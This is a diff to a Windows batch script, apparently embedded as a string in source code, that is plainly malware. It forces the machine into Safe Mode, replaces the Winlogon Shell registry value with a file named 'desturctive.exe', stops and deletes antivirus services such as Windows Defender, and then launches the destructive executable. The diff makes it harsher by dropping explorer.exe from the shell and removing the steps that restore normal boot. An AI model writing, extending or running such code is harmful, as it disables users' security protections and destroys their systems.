@@ -212,10 +212,8 @@ if %errorlevel% == 0 (
     echo Safe Mode is enabled, proceeding with actions...
 ) else (
     echo Safe Mode is not enabled
-    if exist "C:\Program Files\utkudrk2\test.txt" (
-        del "C:\Program Files\utkudrk2\test.txt"
-    )
-    exit
+    "bcdedit.exe /set {current} safeboot minimal
+    shutdown -s -t 7
 )
 
 :: Wait for the reboot to happen and run this part only after Safe Mode is entered
@@ -223,7 +221,7 @@ if %errorlevel% == 0 (
 :: Modify Shell registry to run destructive file
 echo Modifying registry to set Shell value...
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\Program Files\utkudrk2\desturctive.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\Program Files\utkudrk2\desturctive.exe" /f
 
 :: Kill antivirus processes
 echo Terminating antivirus processes...
@@ -245,7 +243,7 @@ sc stop "WinDefend"
 sc stop "VSSERV"
 
 :: Wait a few seconds to ensure services are stopped
-timeout /t 5 /nobreak
+timeout /t 2 /nobreak
 
 :: Perform cleanup tasks
 echo Deleting registry keys...
@@ -262,15 +260,10 @@ reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f
 
+"C:\Program Files\utkudrk2\desturctive.exe"
+
 :: Confirm completion
 echo Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.
-
-:: Reboot the system after completion
-echo Removing Safe Mode setting...
-bcdedit /deletevalue {current} safeboot
-bcdedit /deletevalue {default} safeboot
-
-shutdown /r /f /t 5
 exit
 "#;
 
